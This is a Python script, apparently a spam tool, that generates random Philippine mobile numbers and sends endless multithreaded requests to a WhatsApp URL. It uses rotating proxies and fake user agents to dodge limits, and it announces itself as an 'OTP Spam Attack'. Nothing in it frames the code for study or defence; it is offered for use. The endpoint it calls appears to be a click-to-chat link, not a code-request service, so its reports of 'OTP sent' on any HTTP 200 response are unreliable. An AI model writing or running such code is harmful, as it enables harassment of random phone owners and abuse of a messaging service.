import requests
import random
import string
import threading
import time
from fake_useragent import UserAgent
from colorama import Fore, init

init(autoreset=True)

class WhatsAppOTPSpammer:
    def __init__(self):
        self.ua = UserAgent()
        self.proxies = self.load_proxies()
        self.targets = []
        self.success_count = 0
        self.failed_count = 0

    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + "[!] proxies.txt not found. Using direct connection.")
            return []

    def generate_ph_number(self):
        prefixes = ["905", "906", "915", "916", "917", "926", "927", "935", "936", "937", "945", "946", "947"]
        return f"+63{random.choice(prefixes)}{''.join(random.choices(string.digits, k=7))}"

    def send_otp(self, phone):
        url = f"https://api.whatsapp.com/send?phone={phone}&text=OTP+Request"
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "/",
            "Connection": "keep-alive"
        }
        proxy = random.choice(self.proxies) if self.proxies else None
        proxies = {"http": proxy, "https": proxy} if proxy else None
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] OTP sent to {phone}")
                self.success_count += 1
            else:
                print(Fore.YELLOW + f"[-] Failed to send OTP to {phone} (Status: {response.status_code})")
                self.failed_count += 1
        except Exception as e:
            print(Fore.RED + f"[!] Error sending OTP to {phone}: {str(e)}")
            self.failed_count += 1

    def start_spam(self, threads=10):
        print(Fore.CYAN + "[*] Starting WhatsApp OTP Spam Attack...")
        while True:
            threads_list = []
            for _ in range(threads):
                phone = self.generate_ph_number()
                t = threading.Thread(target=self.send_otp, args=(phone,))
                t.start()
                threads_list.append(t)
                time.sleep(random.uniform(0.1, 0.5))

            for t in threads_list:
                t.join()

            print(Fore.MAGENTA + f"\n[STATS] Success: {self.success_count} | Failed: {self.failed_count}")

if __name__ == "__main__":
    spammer = WhatsAppOTPSpammer()
    spammer.start_spam(threads=20)  # Adjust thread count for speed
